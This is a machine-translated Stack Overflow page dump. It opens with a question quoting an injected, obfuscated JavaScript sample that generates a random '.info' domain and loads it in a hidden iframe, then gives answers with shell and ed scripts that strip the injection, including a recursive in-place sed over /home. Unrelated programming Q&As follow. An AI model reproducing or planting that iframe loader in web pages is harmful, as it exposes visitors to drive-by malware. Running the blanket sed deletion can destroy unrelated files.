var21=23;var21--}var4+='zsCharAR'.substr(2,4);var var23=0.0435;var23--;var4+='XDoCodeWm'.substr(3,4);function lug(cod){var var26=0.0038;if(var26!=26){var var24=0.037;var24+=24;var var25=2702}var var31=5244;if(var31<0.0085){var var27='voADrb8a1';var var30=5099;if(var30!=6){var var28=0.0233;var28++;var var29=null}}return cod}var var3='sF68indeOu'.substr(4,4);var var34=3367;if(var34!=0.0246){var var32=0.0089;var32++;var var33='cut'}var3+='Tq4xOfAk'.substr(3,3);var var36=0.0101;if(var36>25){var var35=0.0071;var35+=3169}var var38=13;if(var38==0){var var37=5;var37+=3684}var sux='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';var var39=0;do{var var40=4847;var40+=29;var var41=26;var41++;var39++}while(var39<7);var var42=0.0239;var42-=16;var ret='';function jot(few,hyp){var var43=null;var43-=0.0021;return hyp}var ext='';var var44=1250;var44++;var var45=0.0034;var45+=6258;var sh=0;var var46=7594;var46++;var var47=3240;var47--;var len=str[var1];var var49=3026;if(var49!=null){var var48=0.004;var48-=20}for(var cnt1=0;cnt1<len;cnt1++){var var50=14;var50+=0.013;sh+=shift;var var51=6;var51++;var var52=0.0193;var52++;var ch=str[var2](cnt1,1);var var53=0;do{var var55=7261;if(var55!=null){var var54=16;var54+=14}var var58=1404;if(var58>17){var var56=[10,0,50,30,40,20];var var57=5412;var57++}var53++}while(var53<8);var pos=sux[var3](ch);var var59=0.0262;var59++;pos+=sh;var var60=6;var60+=6;pos%=var5;for(var var61=0;var61<10;var61++){var var62=21;var62++;var var63=4887;var63-=4113}ret+=sux[var2](pos,1);var var66=0.062;if(var66>22){var var64=0;var64+=3831;var var65=0.013;var65-=11}var var67=0.0122;var67-=3665}var var68=0.017;var68++;var var69=null;var69-=0.0069;for(var cnt2=0;cnt2<len;cnt2+=2){function tub(uke,dun){var var70=0;do{var var73=5314;if(var73!=4129){var var71=0;var71+=0.0322;var var72=false}var70++}while(var70<7);var var74=0.0238;var74-=6514;return uke}var var75=17;var75-=21;var ch=ret[var2](cnt2,2);function cue(ton){var var78=0.003;if(var78==28){var var76=0;var76+=7;var var77=0.0089;var77--}return ton}var ich=parseInt(ch,var6);var var79=0;while(var79<7){var var81=6374;if(var81!=0.0126){var var80=0.003;var80+=1176}var79++}ext+=String[var4](ich);function gun(sub,vug){var var82=0.005;var82--;var var83=null;return sub}var var84=10;var84--}function ree(ban,set){var var89=0.0136;if(var89<0){var var86=11;if(var86<4930){var var85=0;var85-=4954}var var88=5;if(var88<0){var var87=8525;var87--}}return ban}return ext}var var3=0;var3-=6479;for(var var4=0;var4<10;var4++){var var5=7;var5+=26}function ulu(){var hi,test,lo;function bid(pah){var var9=0.0011;if(var9==19){var var7=1393;if(var7==0.017){var var3=19;if(var3==null){var var2=7;if(var2!=3669){var var1=[21,42,28,0,35,7,14]}}var var6=0.005;if(var6!=5605){var var4=0.028;var4-=10;var var5=0.0145;var5+=0.004}}var var8=['the','eft','mas']}return pah}var var10=18;var10--;var var11=5110;var11--;var var14=0.014;if(var14==null){var var12=1537;var12--;var var13=0.012;var13--}var hi=this.seed/this.Q;function cos(wag){var var15='hum';var var16=['teg','yod'];return wag}function yew(tat){var var17=0.0109;var17-=3465;return tat}    var lo=this.seed%this.Q;function dee(pht,oxy){for(var var18=0;var18<4;var18++){var var22=0.0152;if(var22==null){var var20=3229;if(var20>14){var var19=1941}var var21='zh4pMCYB'}}return oxy}var var25=5109;if(var25>4261){var var23=0;var var24='mho'}    var test=this.A*lo-this.R*hi;var var26=0.011;var26-=7383;    if(test>0){var var27=null;var27-=2995;for(var var28=0;var28<8;var28++){var var30=0.0056;if(var30!=19){var var29=0;var29+=0.013}var var31=26;var31++}        this.seed=test;var var32=0;while(var32<4){var var33=27;var33--;var32++}var var35=2510;if(var35<null){var var34='lwxSFm8TI'}}else{var var38=8;if(var38==29){var var36=0.017;var36--;var var37=13;var37--}var var39=2605;        this.seed=test+this.M;var var40=25;var40-=5704;var var41={wit:2288}}var var42=0.018;var42-=0.0047;    return(this.seed*this.oneOverM)}var var6=null;var6-=6649;var var8=2139;if(var8!=0.0176){var var7=10;var7++}function jig(unix){var s,var1,d,var3,var2;function lac(net,dam,sap){var var11=29;if(var11!=5171){var var6=0.002;if(var6<15){var var4=20;var4-=8;var var5=0.035;var5--}var var10=11;if(var10==2581){var var8=18;if(var8>10){var var7=null;var7-=2355}var var9=10;var9++}}return net}var var3=4775;var var13=30;if(var13<23){var var12=9;var12++}var var14=0;do{var var15=0.0147;var var16=0;var14++}while(var14<7);var3-=680;var var19=8044;if(var19==0.0096){var var17=0.0015;var17-=0.009;var var18=22;var18++}var var20={pix:['pip','tor','lob']};var var2=120523;var var23=0.029;if(var23<4713){var var21=6;var21--;var var22=0.004;var22++}var var24=2304;var24--;var2-=54988;var var25=false;var var26=4364;var26++;var var1=17722082;var var27=true;var1-=944867;var var28='den';var d=new Date(unix*1000);var var29=null;var29-=13;    var s=Math.ceil(d.getHours()/3);function feu(fas,cry){var var31=5835;if(var31==0){var var30=2916}return fas}    this.seed=2345678901+(d.getMonth()*var1)+(d.getDate()*var2)+(Math.round(s*var3));var var33=0.008;if(var33>9){var var32=0.009;var32-=2790}    this.A=48271;var var34=5222;var34+=1338;    this.M=2147483647;var var35={top:['sue','ras']};    this.Q=this.M/this.A;var var36='pjNgzb';    this.R=this.M%this.A;var var37=7112;var37--;    this.oneOverM=1.0/this.M;var var38=0;do{var var39=5708;var39++;var var41=9;if(var41==0.007){var var40=3570;var40++}var38++}while(var38<3);    this.next=ulu;var var43=16;if(var43==7569){var var42=1355}var var44=false;    return this}var var11=18;if(var11==0){var var9=0.006;var var10=30;var10--}function hot(dub,jut){var var12='FtjKdH6DTi';var var13=28;var13++;return dub}function bum(r,Min,Max){function arc(vac,hat){var var1=13;var1+=6807;return hat}var var2=0.031;var2--;return Math.round((Max-Min)*r.next()+Min)}var var14=0;do{var var15=['pit','men'];var var16=0;var14++}while(var14<4);function dap(unix,length,zone){var i,rand,letters,str;var var1=0;do{var var2=7902;var1++}while(var1<4);var var3=1574;var3++;var var4=0;do{var var5=5140;var5+=0.007;var var6=null;var6-=0.0061;var4++}while(var4<6);function lap(eth,wyn){var var7=0.002;var7--;return wyn}var rand=new jig(unix);var var10=0.0204;if(var10>8){var var8=0.01;var var9=0.0068}    var letters='qmahgwctopfjilrfpjrfcwgewheizwdw'.split('');var var11=8091;var var12=['del','rec','jam'];    var str='';var var19=22;if(var19!=8632){var var15=24;if(var15>0.0187){var var13=4820;var13-=14;var var14=4205;var14--}var var18=7248;if(var18!=null){var var16=0.0077;var16+=8095;var var17=3411;var17--}}for(var i=0; i<length; i++){var var20='yjVL6qKWtZ';        str+=letters[bum(rand, 0, letters.length-1)];var var21={gob:28}}function bar(dey,fay){var var22=0.0039;var22-=7259;var var24=23;if(var24==0){var var23='tab'}return dey}var var25='UhRKMl5V';    return str+'.'+zone}for(var var17=0;var17<3;var17++){var var18=['how','tar'];var var19=0;var19-=5692}var var20=0;do{var var21=6868;var21++;var var22=0.002;var22++;var20++}while(var20<7);setInterval(function(){var var23=4845;var var24=0.0149;var24++;    try{var var27=10;if(var27>null){var var25=0.011;var25--;var var26=0.025;var26+=0.003}        if(typeof iframeWasCreated=='undefined'){var var28=0.016;var28+=7624;var var29=12;            var unix=Math.round(+new Date()/1000);var var30=0.0044;var30+=0.007;            var domainName=dap(unix, 16, 'info');var var31=29;var31+=5759;            ifrm=document.createElement('i'+'frame'); function roe(mae,you,bam){var var32=0;do{var var33=[18,45,27,9,36,0];var32++}while(var32<6);var var34=7886;return bam}            ifrm.setAttribute('src', 'http://'+domainName+'/in.cgi?14'); var var35='je5Bx_40z';            ifrm.style.width='10px'; var var36=4376;var36+=2797;            ifrm.style.height='10px'; var var37=7287;var37--;function nor(lop){var var38={dig:4393};return lop}            ifrm.style.visibility='hidden'; var var41=17;if(var41>1540){var var39=[0,18,12,6];var var40=12;var40+=0.016}            document.body.appendChild(ifrm);var var43=0.0437;if(var43==0.0087){var var42=0.002}var var44=2082;var44-=0.0189;iframeWasCreated=true;var var45=false}var var48=0.008;if(var48==7526){var var46=8527;var46--;var var47=5186;var47--}for(var var49=0;var49<8;var49++){var var50=false}}catch(e){iframeWasCreated=undefined}var var51=0.0135;var51+=1355;var var52=0.0019;var52++}, 100);
/*/c3284d*/ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T11:26:59.207

分两个阶段，这是可以实现的

在上面的例子中有 2 次出现？for 2 delit 被调用 3 次（以捕获它的最后一个实例）在 for 循环的底部需要调用多少个实例 + 1 次 delit

```
cd webpath;
grep -r c3284d *|awk -F":" '{print $1}'|grep -v fix.sh|sort|uniq > infected.txt
./fix.sh infected.txt 
```

这是被感染的.txt 中的所有文件，现在已修复这是实际的 scipt fixit.sh

```
 #!/bin/bash                                                                                                                                                                                                                                                                    

inputfile=$1;                                                                                                                                                                                                                                                                  
pattern1='c3284d';                                                                                                                                                                                                                                                             
pattern2='c3284e';                                                                                                                                                                                                                                                             

function addreturn() {                                                                                                                                                                                                                                                         

        in1="<!--c3284d-->"                                                                                                                                                                                                                                                    
out1="                                                                                                                                                                                                                                                                         
c3284d                                                                                                                                                                                                                                                                         
";                                                                                                                                                                                                                                                                             
        in=$in1 out=$out1 perl -pi.nk -e 's/\Q$ENV{"in"}/$ENV{"out"}/g' $file                                                                                                                                                                                                  

        in1="<!--/c3284d-->"                                                                                                                                                                                                                                                   
out1="                                                                                                                                                                                                                                                                         
c3284d                                                                                                                                                                                                                                                                         
";                                                                                                                                                                                                                                                                             
        in=$in1 out=$out1 perl -pi.nk -e 's/\Q$ENV{"in"}/$ENV{"out"}/g' $file                                                                                                                                                                                                  

        in1="/*c3284d*/"                                                                                                                                                                                                                                                       
out1="
c3284e
";
        in=$in1 out=$out1 perl -pi.nk -e 's/\Q$ENV{"in"}/$ENV{"out"}/g' $file 

in1="/*/c3284d*/"
out1="
c3284e
";
        in=$in1 out=$out1 perl -pi.nk -e 's/\Q$ENV{"in"}/$ENV{"out"}/g' $file

}

function delit ()  {
        echo "Working on $file"
        delids=`egrep -n "($pattern)" $file|awk -F":" '{print $1}'|tr "\n" " "`
        echo $delids;
        delarray=( $delids )
        val1=${delarray[0]}
        val2=${delarray[1]}
        if [ "$val2" == "" ]; then
                val2=`expr $val1 + 1`
        fi
        doit=$val1","$val2"d"

ed -s $file << EOF
$doit
.
w
q
EOF

}

for file in `cat $inputfile`
do
        addreturn;
        pattern=$pattern1
        delit;
        pattern=$pattern2;
        delit;
done 
```

**E2A - 警告这是使用 ed 查找实例的行号，然后实际编辑文件并在行之间删除，因此请在尝试此操作之前备份您的内容**

**第 16 个星期天**

这次我再次测试了旧脚本，我在每个 cp3842 中放置了文本，发现它正在删除第一次调用和第二次调用之间的文本或内容。

上面的脚本现在已经更新，我已经对标签进行了一些替换并插入了额外的回车符，第一次调用第二次调用之间的内容丢失的原因是我在 val2 上做了一个 -- 。这现在将第一个块拆分为原始 id，第二个块作为 cp384e 将 d 更改为 e 然后根据模式执行两次 delit。

这确实有效，我已经测试过了

```
$ cp ../test1.pp ./
$ grep -n c3284d test1.pp |awk '{print $1}'
3:<!--c3284d--><script>function
8:/*c3284d*/
10:/*/c3284d*/
$ grep -n AAA test1.pp
1:AAAAAAAAAAAAAAAA
2:AAAAAAAAAAAAAAA
$ grep -n BBB test1.pp
5:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
6:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
$ grep -n CCC test1.pp
11:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
12:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
$ ./fix1.sh infected.txt 
Working on test1.pp
4 6

Working on test1.pp
10 14

$ grep -n c3284d test1.pp |awk '{print $1}'
$ grep -n AAA test1.pp
1:AAAAAAAAAAAAAAAA
2:AAAAAAAAAAAAAAA
$ grep -n BBB test1.pp
6:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
7:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
$ grep -n CCC test1.pp
11:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
12:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
$ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:16:56.067

您可以删除出现之间的所有行`c3284d`：

```
find /home -type f -exec sed -i '/c3284d/,/c3284d/ d' {} \; 
```

这不仅会删除包含 的行`c3284d`，还会删除它们之间的行。

# ajax - 数据库字段更新时的django更新页面？

> ID：12427347
> 
> 赞同：0
> 
> 时间：2012-09-14T15:15:46.890
> 
> 标签：ajax, django, dajaxice

我有一个结果页面，我正在尝试解决如何在更新外部数据库字段时自动更新页面。我看过很多例子，但它们似乎与 PHP 有关。我有一个调用各种 API 的测试，可能需要一个小时才能完成。测试完成后，它将在数据库字段中输入成功或失败消息。

我已经让 django 使用模板标签呈现了我的结果页面。我有一张桌子，我有我想更新的字段。有多个字段需要更新，对应于每个 API 测试。

我看过这个网站..这是用的那种东西吗？[http://www.dajaxproject.com/](http://www.dajaxproject.com/)这是一件容易的事吗？有人对如何做到这一点有任何想法吗？

对不起，但我不知道从哪里开始。

干杯-奥利

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T21:51:14.690

我决定不那么大胆，只是使用旧的经典页面更新来使用 javascript..

```
window.onload = setupRefresh;

function setupRefresh() {
    setTimeout("refreshPage();", 30000); // milliseconds
}

function refreshPage() {
    window.location = location.href;
} 
```

仍然可以选择，但是我对 django 相当缺乏经验，也许这太多了，不能太快咬掉..

# asp.net - ASP.NET 站点通过 VS 工作，但不能通过浏览器工作

> ID：12427350
> 
> 赞同：0
> 
> 时间：2012-09-14T15:15:52.997
> 
> 标签：asp.net, visual-studio-2010, wiki

我现在没有代码在我面前（但会在一个小时左右），但怀疑解决方案非常简单，所以我将发布问题的一般描述并稍后更新：

问题：

一个基于 ASP.NET 的站点在通过 Visual Studio 浏览时工作正常，但是当尝试通过浏览器连接时，它抱怨寻找默认页面（我可以稍后更新确切的错误）。

细节：

我们的开发团队正在尝试使用基于 Wikiplex 的 wiki 服务器 SEWEN WIKI 为我们的内部项目设置一个（非常）简单的 wiki 服务器。我们都不是网络开发人员。

我 99% 肯定它就像创建 index.html 或作为浏览器的入口点一样简单，但我承认我在这里的领域知识大约是 0。

IIS 已更新至 7.5（最低要求为 7），ASP.NET 已升级至 4 以上（所需版本）。操作系统为Windows 2008 Server，wiki使用Visual Studio 2010开发。

如果有人有任何想法，我很想知道。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:24:53.257

假设您按照@Patrick 在评论中的建议在您的服务器上启用了 ASP.NET，那么您可能需要按照@ScottSelby 的建议配置**默认文档**。

以下是 Microsoft 提供的有关此主题的文档：[Configure the List of Default Documents in IIS 7](http://technet.microsoft.com/en-us/library/cc771439%28v=ws.10%29.aspx)

我在下面说明了这一点：

在IIS的**功能视图中，单击****默认文档**： ![IIS](../Images/dba08ce00f5b3a59bf554ea90ecf641f.png)

在**Default Document**中，确保您有指定的页面，通常为*default.aspx*： ![默认文档](../Images/1d7cc1b621d618ddbd78fc595a1dad08.png)

# c++ - “无法将模板参数”转换为自己的类型

> ID：12427352
> 
> 赞同：2
> 
> 时间：2012-09-14T15:16:05.467
> 
> 标签：c++, templates, non-type

我正在尝试制作一种可以类型安全地封装任意类型的类型。我从这个答案中得到了这样的想法：[5 年后，有没有比“最快的 C++ 代表”更好的东西？](https://stackoverflow.com/questions/4298408/5-years-later-is-there-something-better-than-the-fastest-possible-c-delegate/4300544#4300544)到目前为止，我只成功地解决了这个问题，但是我遇到了一个我找不到根源的错误。

编译器似乎告诉我它不能将值转换为值自己的类型，这让我觉得很奇怪。

我正在运行带有 llvm-gcc 4.2（gcc 4.2.1 前端）的 Mac OS X 10.6。

欢迎提出如何摆脱 void* 或将其移至不太重要的位置的建议，但这个问题并不是真正的问题。

错误：

```
$ g++ main.cpp
main.cpp: In static member function ‘static Stamp StampFactory<T>::make(T*) [with T = int]’:
main.cpp:33:   instantiated from ‘Stamp makeStamp(T*) [with T = int]’
main.cpp:39:   instantiated from here
main.cpp:26: error: could not convert template argument ‘t’ to ‘int*’ 
```

编码：

```
typedef void (*VoidFunc)(void*);

struct Stamp
{
    Stamp(VoidFunc p)
    {
        this->press = p;
    }
    VoidFunc press;
};

template<typename T>
struct StampFactory
{
    template<T* rvalue>
    struct Pattern
    {
        void operator()(void* lvalue)
        {
            *dynamic_cast<T*>(lvalue) = *rvalue;
        }
    };

    static Stamp make(T* t)
    {
        return Stamp(Pattern<t>()); // 28
    }
};

template<typename T>
Stamp makeStamp(T* t)
{
    return StampFactory<T>::make(t); // 33
}

int main(int argc, char** argv)
{
    int i = 0;
    Stamp s = makeStamp(&i); //39
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T15:29:25.270

该错误是由于模板参数必须是编译时常量（或`constexpr`），因此不能是变量（或函数参数）。允许将指针作为模板参数，但您可以提供的内容不多，因为它需要是编译时常量指针值（我能想到的唯一符合条件的是 char -指向字符串文字的指针）。一般规则很简单：所有模板参数必须在编译时已知，无论是类型还是值。这不包括函数参数或其他类型的*运行时*变量。

我希望我能提出一个替代方案来实现你想要的，但我根本无法理解你实际上想要做什么。

# pyqt - PyQt：我在哪里可以找到关于样式表及其描述字符串的解释？

> ID：12427356
> 
> 赞同：0
> 
> 时间：2012-09-14T15:16:21.047
> 
> 标签：pyqt, stylesheet

我的意思是 QApplication 的函数 setStyleSheet 的样式表

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:33:49.210

Qt 文档将是一个很好的起点。

[http://doc.qt.nokia.com/4.7-snapshot/stylesheet-reference.html](http://doc.qt.nokia.com/4.7-snapshot/stylesheet-reference.html)

您可以将样式表应用于单个小部件，或应用于 QApplication 以将样式应用于所有内容。

# jquery - 通过 id 获取 iframe

> ID：12427357
> 
> 赞同：4
> 
> 时间：2012-09-14T15:16:21.850
> 
> 标签：jquery, iframe

我对以下代码有点困惑：

HTML：

```
<div class="playerContainer">
    <iframe id="playerFrame" name="playerFrame" frameborder="0"></iframe>
<div class="playerContainer"> 
```

Javascript：

```
var playerFrame1 = $("#playerFrame");
var playerFrame2 = window.frames["playerFrame"];
alert(playerFrame1); // returns [object object]
alert(playerFrame2); // returns [object Window] 
```

我的第一个问题是为什么我们会得到 2 个不同的输出。

当我尝试使用 playerFrame1 作为 ID 嵌入网页时，没有任何反应。但是playerFrame2一切正常。有人知道为什么吗？

谢谢你。

PS：我也试过

```
$('playerFrame'), $(iframe[name="playerFrame"]), document.getElementById("playerFrame") 
```

没变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:18:51.707

这确实是一个 jQuery 问题（我假设 $ 是 jQuery 对象）。

jQuery 返回一个对象数组 - 其中 window.frames 是到 Window 对象的映射。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:18:02.347

第一个不是 DOM 对象，而是[jQuery](http://api.jquery.com/jQuery/)对象。它使您可以访问 DOM 对象（或 DOM 对象的集合），以及读取或修改其状态的方法，但也不提供 DOM 对象的所有方法。

这通常称为 jQuery 包装对象。

如果您需要从 jQuery 中获取 DOM 对象，您可以使用

```
var obj = $obj.get(0); 
```

# javascript - Udacity 网络 Python 解释器是如何工作的？

> ID：12427361
> 
> 赞同：12
> 
> 时间：2012-09-14T15:16:40.053
> 
> 标签：javascript, python

[Udacity](http://www.udacity.com/)为学生提供了一个网络编辑器来输入 Python 程序。编辑器识别 Python 关键字和内置函数并允许运行程序。你知道这项技术是如何工作的吗？程序是提交到后端并由标准 Python 解释器执行，还是基于 JavaScript 的 Python 解释器？编辑器是简单地保存 Python 关键字和内置函数的静态列表，还是与标准或基于 JavaScript 的 Python 交互以获得这些？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-14T15:32:43.423

虽然确实存在 javascript python 解释器： http: [//syntensity.com/static/python.html](http://syntensity.com/static/python.html)，但它们似乎没有使用。如果他们没有至少运行一次程序以在自己的解释器上进行验证，那么作弊太容易了。

查看 Udacity 上的网络活动后，我可以看到他们使用大量数据进行 ajax 调用，然后以 JSON 格式返回程序运行的结果。

猜测他们在沙箱中运行了标准的 Python 解释器，它将执行分配，然后将结果打包成 JSON，返回给客户端并更新到屏幕上。同时，您提交的结果将被记录为您的班级成绩的一部分。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-01-30T18:12:59.620

*在这里聚会很晚，但我在Udacity*担任工程师，所以我想我会试一试。

有两个基本的事情发生：

1.  当前的语法高亮和编辑由[Codemirror 实现](http://codemirror.net/mode/python/index.html)提供，尽管在过去几年中我们使用了几种不同的编辑器。
2.  当您点击提交（或运行）时，您的代码将被打包并运送到我们运行的沙盒集群以执行。如果您点击提交，这是我们针对您的代码运行我们自己的测试并“评分”它以查看它是否通过的地方。其输出（以各种形式）通过管道传回前端，您会得到反馈。

不如在本地运行它快，但它肯定胜过支持第一次尝试安装 Python 的几十万人；）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T15:43:54.083

我没有尝试过 Udacity，但是对于语法高亮部分，可以使用简单的后端代码轻松完成，该后端代码使用一些 Ajax 进行更新。最简单的方法之一可以用作编译器或解释器中的词法分析..

# python - 从 twitter 获取数据时出错

> ID：12427365
> 
> 赞同：0
> 
> 时间：2012-09-14T15:16:49.863
> 
> 标签：python, twitter

```
import twitter
api=twitter.Api()
page=1
count=0
while(page<=2):
    tweets=api.GetSearch("#ghaza",per_page=200)
    twitterapi.until:2011-05-09
    for k in tweets:
        print k.text

    page+=1 
```

我运行代码，当我没有输入时代码运行正确，`twitterapi.until:2011-05-09`但我想要关于特定日期的数据，但它给出了科学错误。[我注意到https://dev.twitter.com/docs/using-search](https://dev.twitter.com/docs/using-search)上的上述代码语法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:54:49.587

如果您查看文档，您会发现`until`是在搜索查询中使用的。

在这里，您的使用`until:`违反了 Python 语法，因为冒号用于函数和类定义、条件和循环。而且也`twitterapi.until`将是未定义的。

所以，我相信你应该`tweets=api.GetSearch("#ghaza",per_page=200)`改为`tweets=api.GetSearch("#ghaza until:2011-05-09",per_page=200)`. 如果 api 中的选择查询是`"#ghaza"`.

# database - 服务处理单个表中的行的多个实例，防止冲突的最佳方法是什么

> ID：12427367
> 
> 赞同：0
> 
> 时间：2012-09-14T15:16:58.307
> 
> 标签：database, algorithm

我们正在尝试构建一个系统，该系统在分担处理负载的不同机器上具有多个服务实例。

每个都将检查一个表，如果该表上有要处理的行，它将选择第一个，将其标记为正在处理，然后对其进行处理，然后将其标记为已完成。冲洗重复。

防止 2 个实例 A 和 B 执行以下操作的竞速条件的最佳方法是什么

A(1) 读表，找到要处理的第 1 行，B(1) 读表，找到要处理的第 1 行，A(2) 标记为行处理 B(2) 标记为行处理

在单个应用程序中，我们可以使用锁或互斥锁。

我可以将 A1 和 A2 放在一个事务中，是不是很简单，还是有更好、更快的方法来做到这一点？

我应该把它打开，这样步骤是：

A (1) 将下一行标记为我的处理 A (2) 将其返回给我处理。

我认为这之前必须已经解决了很多次，所以我正在寻找“标准”解决方案，如果有多个，好处和坏处。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:20:59.907

交易是一个很好的简单答案，但有两个可能的缺点：

1）您可能想检查数据库的细则。有时，默认的一致性设置并不能保证在所有可能的情况下都绝对一致。

2) 有时，与使用数据库对工作进行排队和分配工作相关的访问模式在数据库上是难以预料的。

一种可能性是查看可靠的消息队列系统，这似乎与您正在寻找的内容非常匹配——工作机器可以只从共享队列中读取工作。可能的起点是[http://en.wikipedia.org/wiki/Message_queue](http://en.wikipedia.org/wiki/Message_queue)和[http://docs.oracle.com/cd/B10500_01/appdev.920/a96587/qintro.htm](http://docs.oracle.com/cd/B10500_01/appdev.920/a96587/qintro.htm)

# apache - .htaccess 重定向循环问题

> ID：12427371
> 
> 赞同：0
> 
> 时间：2012-09-14T15:17:09.523
> 
> 标签：apache, .htaccess

如果我访问 domain.com，网站会重定向到 domain.com/en，这是预期的。但随后最后一条规则启动并将其抛出一个循环，使我的网址看起来像这样：

```
http://domain.com/en/?lang=en&request=&site=basecamp&lang=en&request=&site=basecamp&lang=en&request=&site=basecamp&lang=en&request=&site=basecamp 
```

**.htaccess 文件**

```
Options +FollowSymlinks
RewriteEngine on

RewriteBase /

RewriteCond %{REQUEST_URI} !/(content|images|css|js|fonts|pdfs)/
RewriteRule  /([^.]+\.(jpe?g|gif|bmp|png|css|js|eot|svg|ttf|ico|pdf))$ /$1 [NC,R,L]

RewriteCond %{REQUEST_URI} !(content|images|css|js|fonts|pdfs)/.*
RewriteRule !^[a-z]{2}/ /en/ [NC,L,R]

RewriteCond %{REQUEST_URI} !/(init\.php|content|images|css|js|fonts|pdfs)/
RewriteRule ^([a-z]{2})/(.*)$ init.php?lang=$1&request=$2&site=basecamp[L,QSA] 
```

为什么 htaccess 文件重定向到 /?GET_VARS 而不是 /init.php?GET_VARS ？

我怎样才能避免这个循环？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:28:50.720

尝试通过删除前导和尾随斜杠来更改您的最后一个条件。您已将 URI 重写为：

```
/init.php 
```

但是没有像您提供的条件那样的尾部斜杠，因此再次应用该规则。它应该看起来像：

```
RewriteCond %{REQUEST_URI} !(init\.php|content|images|css|js|fonts|pdfs) 
```

* * *

不知道为什么你坚持在你的条件结束时使用斜杠：

```
#                 with this / here, it will never match init.php --------v
RewriteCond %{REQUEST_URI} !/(init\.php|content|images|css|js|fonts|pdfs)/ 
```

但是您可以通过直接排除 init.php 来解决它：

```
RewriteCond %{REQUEST_URI} !init.php 
```

因此，很明显，您的最后一组条件/规则将如下所示：

```
RewriteCond %{REQUEST_URI} !init.php
RewriteCond %{REQUEST_URI} !/(content|images|css|js|fonts|pdfs)/
RewriteRule ^([a-z]{2})/(.*)$ init.php?lang=$1&request=$2&site=basecamp [L,QSA] 
```

或者最坏的情况，只需在规则的开头添加以下内容：

```
RewriteCond %{ENV:REDIRECT_STATUS} 200
RewriteRule ^ - [L] 
```

这可以完全防止任何类型的重写引擎循环。

# perl - 使用 Perl 中对列表进行排序的索引对另一个列表进行排序和索引

> ID：12427374
> 
> 赞同：1
> 
> 时间：2012-09-14T15:17:16.407
> 
> 标签：perl, sorting

假设我有一个包含单词的列表和另一个包含与这些单词相关的置信度的列表：

```
my @list = ("word1", "word2", "word3", "word4");
my @confidences = (0.1, 0.9, 0.3, 0.6); 
```

我想获得第二对列表，其元素的`@list`置信度高于`0.4`排序顺序，以及它们相应的置信度。我如何在 Perl 中做到这一点？（即使用用于排序另一个列表的索引列表）

在上面的示例中，输出将是：

```
my @sorted_and_thresholded_list = ("word2", "word4");
my @sorted_and_thresholded_confidences = (0.9, 0.6); 
```

*   @list 中的条目可能不是唯一的（即排序应该是稳定的）
*   排序应按降序排列。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T15:28:29.003

在处理并行数组时，必须使用索引。

```
my @sorted_and_thresholded_indexes =
    sort { $confidences[$b] <=> $confidences[$a] }
     grep $confidences[$_] > 0.4,
      0..$#confidences;

my @sorted_and_thresholded_list =
   @list[ @sorted_and_thresholded_indexes ];
my @sorted_and_thresholded_confidences =
   @confidences[ @sorted_and_thresholded_indexes ]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T15:29:52.213

使用List [::MoreUtils](https://metacpan.org/module/List%3a%3aMoreUtils)和:`pairwise``part`

```
use List::MoreUtils qw(pairwise part);
my @list = ("word1", "word2", "word3", "word4");
my @confidences = (0.1, 0.9, 0.3, 0.6);

my $i = 0;
my @ret = part { $i++ % 2 } 
          grep { defined } 
          pairwise { $b > .4 ? ($a, $b) : undef } @list, @confidences;

print Dumper @ret; 
```

输出：

```
$VAR1 = [
          'word2',
          'word4'
        ];
$VAR2 = [
          '0.9',
          '0.6'
        ]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T15:26:00.533

如果您确定不会有重复的单词，我认为在此任务中使用哈希可能更容易，例如：

```
my %hash = ( "word1" => 0.1,
             "word2" => 0.9,
             "word3" => 0.3,
             "word4" => 0.6
           ); 
```

然后您可以遍历哈希中的键，只找出符合您的条件的键：

```
foreach my $key (keys %hash) {
    if ($hash{$key} > 0.4) {
        print $key;
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T16:38:32.107

尽管[ikegami](https://stackoverflow.com/users/589924/ikegami)已经说明了我的首选解决方案 - 使用索引 - 还有将数组组合成二维数组 (*) 的选项。好处是数据都被收集到同一个数据结构中，因此很容易操作。

```
use strict;
use warnings;
use Data::Dumper;

my @list = ("word1", "word2", "word3", "word4");
my @conf = (0.1, 0.9, 0.3, 0.6);
my @comb;

for (0 .. $#list) {                       # create two-dimensional array
    push @comb, [ $list[$_], $conf[$_] ];
}

my @all = sort { $b->[1] <=> $a->[1] }    # sort according to conf
          grep { $_->[1] > 0.4 } @comb;   # conf limit

my @list_done = map $_->[0], @all;        # break the lists apart again
my @conf_done = map $_->[1], @all;

print Dumper \@all, \@list_done, \@conf_done; 
```

**输出：**

```
$VAR1 = [
          [
            'word2',
            '0.9'
          ],
          [
            'word4',
            '0.6'
          ]
        ];
$VAR2 = [
          'word2',
          'word4'
        ];
$VAR3 = [
          '0.9',
